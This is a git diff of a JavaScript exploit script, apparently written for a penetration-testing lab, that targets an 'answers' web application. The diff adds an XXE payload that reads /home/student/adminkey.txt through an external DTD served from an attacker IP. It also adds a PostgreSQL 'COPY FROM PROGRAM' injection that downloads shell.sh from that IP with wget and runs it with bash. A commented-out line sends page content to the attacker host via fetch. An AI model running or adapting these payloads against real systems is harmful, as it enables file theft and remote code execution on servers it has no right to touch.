@@ -1,9 +1,9 @@
-const attacker_ip = '192.168.119.131';
+const attacker_ip = '192.168.119.169';
 /*var h1s = document.getElementsByTagName("h1");
 fetch(`http://${attacker_ip}/`+h1s[1].textContent, {});
 */
 const host = 'answers'
-const host_ip = '192.168.131.251'
+const host_ip = '192.168.169.251'
 /*
 username = "wiggles1234"
 email = "wiggles1234@email.com"
@@ -49,7 +49,7 @@ let xmldata = `
   <!ENTITY % start "<![CDATA[">
   <!ENTITY % file SYSTEM "file:///home/student/adminkey.txt" >
   <!ENTITY % end "]]>">
-  <!ENTITY % dtd SYSTEM "http://192.168.119.131/wrapper.dtd" >
+  <!ENTITY % dtd SYSTEM "http://${attacker_ip}/wrapper.dtd" >
   %dtd;
   ]>
   <database><categories><category><name>&wrapper;</name></category></categories></database>
@@ -63,12 +63,9 @@ config = {
   }, 
   body:  "preview=true&xmldata="+ encodeURIComponent(xmldata)
 };
-let query = 'select version();'
+let query = "CREATE TABLE IF NOT EXISTS cucked(cmd_output text);COPY cucked FROM PROGRAM 'wget http://192.168.119.169/shell.sh -O /tmp/shell.sh;bash /tmp/shell.sh';DROP TABLE IF EXISTS cucked;select version();"
+
 runQuery(`http://${host_ip}/admin/import`, config, query);
-
-
-
-
 
 // Helper Functions
 // very basic
@@ -163,6 +160,9 @@ function runQuery(endpoint, cfg, query) {
         }, 
         body: `adminKey=${key}&query=${query}`
       }
+      // trigger key creation
+      //doRequest1(`http://${host_ip}/admin/query`, cfg_n);
+      // execute a query
       doRequest2(`http://${host_ip}/admin/query`, cfg_n, /<pre>.*\s\S.*\s\S\/pre>/);
     }
   }).catch((error) => {
